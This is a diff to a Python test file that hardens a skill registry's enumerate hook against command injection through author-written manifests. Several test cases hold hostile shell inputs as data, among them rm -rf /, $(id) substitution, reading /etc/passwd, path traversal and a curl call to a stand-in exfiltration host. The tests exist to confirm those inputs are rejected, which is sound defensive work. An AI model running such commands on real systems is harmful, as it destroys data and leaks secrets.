@@ -842,17 +842,164 @@ class TestEnumerateSkill:
         assert "tasks" in info["artifact_kinds"]
 
     def test_enumerate_hook_yaml_output(self, registry: Path):
+        """Multiline YAML output is the realistic enumerate-hook contract;
+        post-FX.1.7 the hook runs without a shell so ``\\n`` is no longer an
+        allowed inline metachar — packs ship a ``./enumerate.sh`` script
+        instead (same escape valve as validate / install hooks)."""
         registry.mkdir(parents=True)
-        _make_complete_skill(
+        skill_dir = _make_complete_skill(
             registry, "enum-hook",
             hooks={
                 "install": "",
                 "validate": "",
-                "enumerate": "echo 'capabilities:\n  - streaming\n  - recording'",
+                "enumerate": "./enumerate.sh",
             },
         )
+        script = skill_dir / "enumerate.sh"
+        script.write_text(
+            "#!/bin/sh\n"
+            "printf 'capabilities:\\n  - streaming\\n  - recording\\n'\n"
+        )
+        script.chmod(0o755)
         info = enumerate_skill("enum-hook", registry)
-        assert "capabilities" in info or "capabilities_raw" in info
+        assert "capabilities" in info or "capabilities_raw" in info, info
+        assert "enumerate_error" not in info, info.get("enumerate_error")
+
+
+class TestEnumerateHookHardening:
+    """Lock the FX.1.7 contract: enumerate_cmd is allowlist + shell=False.
+
+    Threat model: identical to FX.1.5 (validate) and FX.1.6 (install) —
+    ``skill.yaml`` is author-controlled and copied verbatim into the
+    registry, so any author-injected metacharacter previously mapped to
+    RCE on the registry host (audit B4). Unlike validate_skill, the
+    enumerate_skill caller surface is a result dict, so rejection is
+    surfaced via ``result["enumerate_error"]`` rather than as an issue
+    list — and the hook never raises into the caller.
+    """
+
+    @pytest.mark.parametrize(
+        "metachar_cmd",
+        [
+            "true; rm -rf /tmp/x",   # ;
+            "true | tee out",        # |
+            "true && echo x",        # &
+            "true > out.txt",        # >
+            "echo $(id)",            # $ + ()
+            "echo `id`",             # backtick
+            "true < /etc/passwd",    # <
+            "true\nrm -rf /",        # newline
+        ],
+    )
+    def test_metachar_rejected(self, registry: Path, metachar_cmd: str):
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "metachar-enum",
+            hooks={"install": "", "validate": "", "enumerate": metachar_cmd},
+        )
+        info = enumerate_skill("metachar-enum", registry)
+        assert "capabilities" not in info
+        assert "capabilities_raw" not in info
+        assert "enumerate hook rejected" in info["enumerate_error"]
+        assert "shell metacharacter" in info["enumerate_error"]
+
+    def test_executable_not_in_allowlist_rejected(self, registry: Path):
+        """`/usr/bin/curl evil.com/x` would be a classic exfil command."""
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "evil-enum",
+            hooks={"install": "", "validate": "", "enumerate": "/usr/bin/curl evil.example"},
+        )
+        info = enumerate_skill("evil-enum", registry)
+        assert "enumerate hook rejected" in info["enumerate_error"]
+        assert "not in allowlist" in info["enumerate_error"]
+
+    def test_bare_unknown_executable_rejected(self, registry: Path):
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "unknown-enum",
+            hooks={"install": "", "validate": "", "enumerate": "rmtree --everything"},
+        )
+        info = enumerate_skill("unknown-enum", registry)
+        assert "enumerate hook rejected" in info["enumerate_error"]
+        assert "not in allowlist" in info["enumerate_error"]
+
+    def test_relative_script_inside_skill_dir_allowed(self, registry: Path):
+        registry.mkdir(parents=True)
+        skill_dir = _make_complete_skill(
+            registry, "relpath-enum",
+            hooks={"install": "", "validate": "", "enumerate": "./caps.sh"},
+        )
+        script = skill_dir / "caps.sh"
+        script.write_text("#!/bin/sh\nprintf 'streaming: true\\n'\n")
+        script.chmod(0o755)
+        info = enumerate_skill("relpath-enum", registry)
+        assert "enumerate_error" not in info, info.get("enumerate_error")
+        assert info.get("capabilities") == {"streaming": True}
+
+    def test_relative_path_escape_rejected(self, registry: Path):
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "escape-enum",
+            hooks={"install": "", "validate": "", "enumerate": "../../etc/passwd"},
+        )
+        info = enumerate_skill("escape-enum", registry)
+        msg = info["enumerate_error"]
+        assert "enumerate hook rejected" in msg
+        assert "escapes skill directory" in msg or "script not found" in msg
+
+    def test_missing_relative_script_rejected(self, registry: Path):
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "ghost-enum",
+            hooks={"install": "", "validate": "", "enumerate": "./does_not_exist.sh"},
+        )
+        info = enumerate_skill("ghost-enum", registry)
+        assert "enumerate hook rejected" in info["enumerate_error"]
+        assert "script not found" in info["enumerate_error"]
+
+    def test_python_invocation_allowed(self, registry: Path):
+        """`python3 caps.py` is allowlisted; multi-statement Python lives in
+        a script (not in the manifest) because parens / quotes / `;` are all
+        metachars under the FX.1.7 gate."""
+        registry.mkdir(parents=True)
+        skill_dir = _make_complete_skill(
+            registry, "py-enum",
+            hooks={"install": "", "validate": "", "enumerate": "python3 caps.py"},
+        )
+        (skill_dir / "caps.py").write_text("print('schema_version: 1')\n")
+        info = enumerate_skill("py-enum", registry)
+        assert "enumerate_error" not in info, info.get("enumerate_error")
+        assert info.get("capabilities") == {"schema_version": 1}
+
+    def test_quoted_args_pass_through(self, registry: Path):
+        """`echo "schema: 1"` should still work — shlex preserves quoting and
+        the result is single-line YAML so we stay within the metachar gate."""
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "quoted-enum",
+            hooks={"install": "", "validate": "", "enumerate": 'echo "schema: 1"'},
+        )
+        info = enumerate_skill("quoted-enum", registry)
+        assert "enumerate_error" not in info, info.get("enumerate_error")
+        assert info.get("capabilities") == {"schema": 1}
+
+    def test_metachar_skill_is_still_introspectable(self, registry: Path):
+        """A poisoned enumerate hook must not break the rest of the dict —
+        manifest-derived fields (version, soc list, kinds) must still come
+        through so operators can list and triage the bad pack."""
+        registry.mkdir(parents=True)
+        _make_complete_skill(
+            registry, "poisoned-but-listable",
+            compatible_socs=["Hi3516"],
+            hooks={"install": "", "validate": "", "enumerate": "echo $(id)"},
+        )
+        info = enumerate_skill("poisoned-but-listable", registry)
+        assert info["name"] == "poisoned-but-listable"
+        assert info["has_manifest"] is True
+        assert info["version"] == "1.0.0"
+        assert "Hi3516" in info["compatible_socs"]
+        assert "enumerate_error" in info
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
